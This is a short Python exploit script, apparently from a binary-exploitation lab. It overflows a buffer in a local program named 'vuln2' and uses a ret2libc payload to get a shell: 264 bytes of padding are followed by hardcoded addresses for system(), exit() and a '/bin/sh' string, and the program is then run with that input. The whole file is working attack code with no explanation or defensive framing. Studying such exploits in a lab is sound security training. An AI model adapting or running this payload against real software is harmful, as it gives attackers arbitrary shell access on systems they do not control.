#!/bin/env python
import struct
import subprocess

"""Constants"""
prog = "./vuln2"
libc = 0xb7dd8000
bin_sh = 0xb7f60406
system = libc + 0x00044630
exit = libc + 0x000373a0
char = "A"
len_to_addr = 264
"""Payload"""
padding = char * len_to_addr
bin_sh = struct.pack("I", bin_sh)
system = struct.pack("I", system)
exit = struct.pack("I", exit)

payload = padding + system + exit + bin_sh
"""Execute"""
subprocess.call([prog, payload])




